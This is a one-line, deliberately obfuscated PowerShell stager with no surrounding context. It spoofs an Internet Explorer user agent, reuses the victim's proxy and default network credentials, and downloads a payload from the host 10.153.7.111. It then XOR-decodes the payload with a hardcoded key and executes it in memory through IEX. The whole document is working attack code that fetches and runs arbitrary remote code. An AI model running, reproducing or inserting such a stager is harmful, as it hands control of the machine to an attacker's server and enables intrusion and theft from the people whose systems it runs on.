
$wc=New-OBjECT SYStEM.Net.WebClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEaders.ADD('User-Agent',$u);$WC.PROXy = [SYstEM.NEt.WEbRequEst]::DEfaULtWEBPRoxY;$wc.ProXY.CREDENTIals = [SYsTem.Net.CredentIALCacHe]::DefAuLtNetWorKCredenTiALS;$K='ca`%|QevC}qo/jG.@uUlkA*gH1;Sp\tx';$i=0;[ChaR[]]$B=([CHar[]]($WC.DownloAdStRInG("http://10.153.7.111/index.asp")))|%{$_-bXor$k[$i++%$k.LEnGTh]};IEX ($B-jOin'')

